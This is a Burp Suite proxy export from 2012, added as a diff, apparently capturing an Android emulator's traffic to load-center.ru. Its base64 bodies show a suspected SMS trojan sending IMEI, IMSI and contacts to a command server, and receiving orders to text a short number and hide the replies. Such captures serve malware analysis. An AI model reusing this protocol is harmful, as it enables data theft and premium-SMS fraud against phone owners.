@@ -1,0 +1,90 @@
+<?xml version="1.0"?>
+<!DOCTYPE items [
+<!ELEMENT items (item*)>
+<!ATTLIST items burpVersion CDATA "">
+<!ATTLIST items exportTime CDATA "">
+<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT url (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT port (#PCDATA)>
+<!ELEMENT protocol (#PCDATA)>
+<!ELEMENT method (#PCDATA)>
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT extension (#PCDATA)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT status (#PCDATA)>
+<!ELEMENT responselength (#PCDATA)>
+<!ELEMENT mimetype (#PCDATA)>
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT comment (#PCDATA)>
+]>
+<items burpVersion="1.5" exportTime="Sun Dec 23 16:27:04 GMT+04:00 2012">
+  <item>
+    <time>Sun Dec 23 16:09:30 GMT+04:00 2012</time>
+    <url><![CDATA[http://74.125.143.101/generate_204]]></url>
+    <host ip="74.125.143.101">74.125.143.101</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method>GET</method>
+    <path><![CDATA[/generate_204]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9nZW5lcmF0ZV8yMDQgSFRUUC8xLjENClVzZXItQWdlbnQ6IERhbHZpay8xLjYuMCAoTGludXg7IFU7IEFuZHJvaWQgNC4yOyBzZGsgQnVpbGQvSkJfTVIxKQ0KSG9zdDogNzQuMTI1LjE0My4xMDENCkNvbm5lY3Rpb246IEtlZXAtQWxpdmUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcA0KDQo=]]></request>
+    <status>204</status>
+    <responselength>140</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjA0IE5vIENvbnRlbnQNCkNvbnRlbnQtTGVuZ3RoOiAwDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOA0KRGF0ZTogU3VuLCAyMyBEZWMgMjAxMiAxMjowOTozNSBHTVQNClNlcnZlcjogR0ZFLzIuMA0KDQo=]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Dec 23 16:10:43 GMT+04:00 2012</time>
+    <url><![CDATA[http://load-center.ru/connect.php]]></url>
+    <host ip="54.247.174.38">load-center.ru</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method>POST</method>
+    <path><![CDATA[/connect.php]]></path>
+    <extension>php</extension>
+    <request base64="true"><![CDATA[UE9TVCAvY29ubmVjdC5waHAgSFRUUC8xLjENCkNvbnRlbnQtVHlwZTogbXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9QWFCMDN4DQpVc2VyLUFnZW50OiBEYWx2aWsvMS42LjAgKExpbnV4OyBVOyBBbmRyb2lkIDQuMjsgc2RrIEJ1aWxkL0pCX01SMSkNCkhvc3Q6IGxvYWQtY2VudGVyLnJ1DQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXANCkNvbnRlbnQtTGVuZ3RoOiA1MTQNCg0KLS1BYUIwM3gNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iaW1laSINCg0KMTMxMzI3NTEyODc2MjEzDQotLUFhQjAzeA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJpbXNpIg0KDQozMTAyNjQzMjgyMzQ2NzgNCi0tQWFCMDN4DQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9Im9zIg0KDQphbmRyb2lkDQotLUFhQjAzeA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJjb250YWN0cyINCg0KMQ0KLS1BYUIwM3gNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iRklMRSI7IGZpbGVuYW1lPSJjb250YWN0cy54bWwiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogYmluYXJ5DQoNCjw/eG1sIHZlcnNpb249JzEuMCcgZW5jb2Rpbmc9J1VURi04JyBzdGFuZGFsb25lPSd5ZXMnID8+PG51bWJlcnMgLz4NCi0tQWFCMDN4LS0NCg==]]></request>
+    <status>200</status>
+    <responselength>196</responselength>
+    <mimetype>XML</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IG5naW54LzEuMS4xOQ0KRGF0ZTogU3VuLCAyMyBEZWMgMjAxMiAxMjowMDoxNCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC94bWwNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCkNvbnRlbnQtTGVuZ3RoOiA1MA0KDQo8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCI/Pgo8cmVzcG9uc2UvPg==]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Dec 23 16:11:55 GMT+04:00 2012</time>
+    <url><![CDATA[http://load-center.ru/connect.php]]></url>
+    <host ip="54.247.174.38">load-center.ru</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method>POST</method>
+    <path><![CDATA[/connect.php]]></path>
+    <extension>php</extension>
+    <request base64="true"><![CDATA[UE9TVCAvY29ubmVjdC5waHAgSFRUUC8xLjENCkNvbnRlbnQtTGVuZ3RoOiA3OA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkhvc3Q6IGxvYWQtY2VudGVyLnJ1DQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQpVc2VyLUFnZW50OiBBcGFjaGUtSHR0cENsaWVudC9VTkFWQUlMQUJMRSAoamF2YSAxLjQpDQoNCmltZWk9MDAwMDAwMDAwMDAwMDAwJnRpbWU9MTIxMTU0MjMxMjIwMTImb3M9YW5kcm9pZCZpbXNpPTMxMDI2MDAwMDAwMDAwMCZ2PTIuMQ==]]></request>
+    <status>200</status>
+    <responselength>1096</responselength>
+    <mimetype>XML</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IG5naW54LzEuMS4xOQ0KRGF0ZTogU3VuLCAyMyBEZWMgMjAxMiAxMjowMDozOCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC94bWwNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCkNvbnRlbnQtTGVuZ3RoOiA5NDkNCg0KPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHJlc3BvbnNlPjx0aW1lPjEyMTE1NDI1MTIyMDEyPC90aW1lPjxzbXMgZGVsYXk9IjAiPjxzZW5kIG51bWJlcj0iMTE0MSIgdGV4dD0iMzcwNDE5IiByY29kZXJ4cD0iIiByY29kZWdycD0iMCIgcm51bWJlcnJ4cD0iIiBybnVtYmVyZ3JwPSIwIi8+PC9zbXM+PGZpbHRlcnM+PGRlbGV0ZSBudW1iZXI9IjExNDEiIHRleHQ9IioiPiA8L2RlbGV0ZT48L2ZpbHRlcnM+PHNtc2Nmcz48c21zY2YgdmFsdWU9IjkxMjYzMTM0MzEiLz48c21zY2YgdmFsdWU9IjkxODQzMzAwMDAiLz48c21zY2YgdmFsdWU9IjkxMzk4Njk5OTAiLz48c21zY2YgdmFsdWU9IjkxMDQ5OTkxMDkiLz48c21zY2YgdmFsdWU9IjkxNDc5OTEwMDAiLz48c21zY2YgdmFsdWU9IjkxNjg5OTkxMDAiLz48c21zY2YgdmFsdWU9IjkxNjg5NjAyMjAiLz48c21zY2YgdmFsdWU9IjkxMTIwMDk5OTMiLz48c21zY2YgdmFsdWU9IjkxMDc0NTk5OTkiLz48c21zY2YgdmFsdWU9IjkxNzEwMDIwMDMiLz48c21zY2YgdmFsdWU9IjkyNjI5MDkwOTAiLz48c21zY2YgdmFsdWU9IjkyNjI5MDkwODAiLz48c21zY2YgdmFsdWU9IjkyMTk5MDkwOTAiLz48c21zY2YgdmFsdWU9IjgxMjk2MDAwOTYiLz48c21zY2YgdmFsdWU9IjkxMjk2MDAwOTYiLz48c21zY2YgdmFsdWU9IjkyMDY5MDkwOTAiLz48c21zY2YgdmFsdWU9IjkyODIwMDAwMDIiLz48c21zY2YgdmFsdWU9IjkyODk5MDAwMjgiLz48c21zY2YgdmFsdWU9IjkyNzI5MDkwOTAiLz48c21zY2YgdmFsdWU9IjkyMjI5MDkwOTAiLz48c21zY2YgdmFsdWU9IjkyMDI5MDkwOTAiLz48c21zY2YgdmFsdWU9IjkyMzI5MDkwOTAiLz48c21zY2YgdmFsdWU9IjkyNDIwMDA2OTAiLz48c21zY2YgdmFsdWU9IjkyNDI5MDkwOTAiLz48c21zY2YgdmFsdWU9IjkwMzcwMTExMTEiLz48L3Ntc2Nmcz48L3Jlc3BvbnNlPg==]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Dec 23 16:13:17 GMT+04:00 2012</time>
+    <url><![CDATA[http://load-center.ru/connect.php]]></url>
+    <host ip="54.247.174.38">load-center.ru</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method>POST</method>
+    <path><![CDATA[/connect.php]]></path>
+    <extension>php</extension>
+    <request base64="true"><![CDATA[UE9TVCAvY29ubmVjdC5waHAgSFRUUC8xLjENCkNvbnRlbnQtTGVuZ3RoOiA3OA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkhvc3Q6IGxvYWQtY2VudGVyLnJ1DQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQpVc2VyLUFnZW50OiBBcGFjaGUtSHR0cENsaWVudC9VTkFWQUlMQUJMRSAoamF2YSAxLjQpDQoNCmltZWk9MTMxMzI3NTEyODc2MjEzJnRpbWU9MTIxMzE3MjMxMjIwMTImb3M9YW5kcm9pZCZpbXNpPTMxMDI2NDMyODIzNDY3OCZ2PTIuMQ==]]></request>
+    <status>200</status>
+    <responselength>1096</responselength>
+    <mimetype>XML</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IG5naW54LzEuMS4xOQ0KRGF0ZTogU3VuLCAyMyBEZWMgMjAxMiAxMjowMjoxNSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC94bWwNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCkNvbnRlbnQtTGVuZ3RoOiA5NDkNCg0KPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHJlc3BvbnNlPjx0aW1lPjEyMTMxNzI1MTIyMDEyPC90aW1lPjxzbXMgZGVsYXk9IjAiPjxzZW5kIG51bWJlcj0iMTE0MSIgdGV4dD0iMzcwNDE5IiByY29kZXJ4cD0iIiByY29kZWdycD0iMCIgcm51bWJlcnJ4cD0iIiBybnVtYmVyZ3JwPSIwIi8+PC9zbXM+PGZpbHRlcnM+PGRlbGV0ZSBudW1iZXI9IjExNDEiIHRleHQ9IioiPiA8L2RlbGV0ZT48L2ZpbHRlcnM+PHNtc2Nmcz48c21zY2YgdmFsdWU9IjkxMjYzMTM0MzEiLz48c21zY2YgdmFsdWU9IjkxODQzMzAwMDAiLz48c21zY2YgdmFsdWU9IjkxMzk4Njk5OTAiLz48c21zY2YgdmFsdWU9IjkxMDQ5OTkxMDkiLz48c21zY2YgdmFsdWU9IjkxNDc5OTEwMDAiLz48c21zY2YgdmFsdWU9IjkxNjg5OTkxMDAiLz48c21zY2YgdmFsdWU9IjkxNjg5NjAyMjAiLz48c21zY2YgdmFsdWU9IjkxMTIwMDk5OTMiLz48c21zY2YgdmFsdWU9IjkxMDc0NTk5OTkiLz48c21zY2YgdmFsdWU9IjkxNzEwMDIwMDMiLz48c21zY2YgdmFsdWU9IjkyNjI5MDkwOTAiLz48c21zY2YgdmFsdWU9IjkyNjI5MDkwODAiLz48c21zY2YgdmFsdWU9IjkyMTk5MDkwOTAiLz48c21zY2YgdmFsdWU9IjgxMjk2MDAwOTYiLz48c21zY2YgdmFsdWU9IjkxMjk2MDAwOTYiLz48c21zY2YgdmFsdWU9IjkyMDY5MDkwOTAiLz48c21zY2YgdmFsdWU9IjkyODIwMDAwMDIiLz48c21zY2YgdmFsdWU9IjkyODk5MDAwMjgiLz48c21zY2YgdmFsdWU9IjkyNzI5MDkwOTAiLz48c21zY2YgdmFsdWU9IjkyMjI5MDkwOTAiLz48c21zY2YgdmFsdWU9IjkyMDI5MDkwOTAiLz48c21zY2YgdmFsdWU9IjkyMzI5MDkwOTAiLz48c21zY2YgdmFsdWU9IjkyNDIwMDA2OTAiLz48c21zY2YgdmFsdWU9IjkyNDI5MDkwOTAiLz48c21zY2YgdmFsdWU9IjkwMzcwMTExMTEiLz48L3Ntc2Nmcz48L3Jlc3BvbnNlPg==]]></response>
+    <comment></comment>
+  </item>
+</items>
